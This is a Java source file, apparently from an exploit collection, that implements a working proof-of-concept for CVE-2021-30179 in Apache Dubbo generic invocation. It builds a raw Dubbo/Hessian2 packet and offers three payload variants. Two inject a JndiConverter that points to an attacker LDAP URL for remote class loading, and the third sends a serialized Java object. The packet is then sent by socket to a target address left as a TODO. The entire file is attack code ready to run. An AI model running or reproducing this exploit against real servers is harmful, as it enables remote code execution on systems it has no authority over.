package top.lz2y.vul;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import top.lz2y.tools.FileUtil;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;


/**
 * 漏洞编号:
 *      CVE-2021-30179
 * 适用版本:
 *      Apache Dubbo 2.7.0 to 2.7.9
 *      Apache Dubbo 2.6.0 to 2.6.9
 *      Apache Dubbo all 2.5.x versions
 */
public class CVE202130179 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.8");
            //todo 此处填写Dubbo提供的服务名
        out.writeUTF("top.lz2y.service.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
            //todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        // POC 1: raw.return
//        getRawReturnPayload(out, "ldap://127.0.0.1:8087/Exploit");

        // POC 2: bean
        getBeanPayload(out, "ldap://127.0.0.1:8087/Exploit");

        // POC 3: nativejava
//        getNativeJavaPayload(out, "src\\main\\java\\top\\lz2y\\1.ser");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("192.168.137.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws IOException {
        byte[] payload = FileUtil.getBytesByFile(serPath);
        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }
}
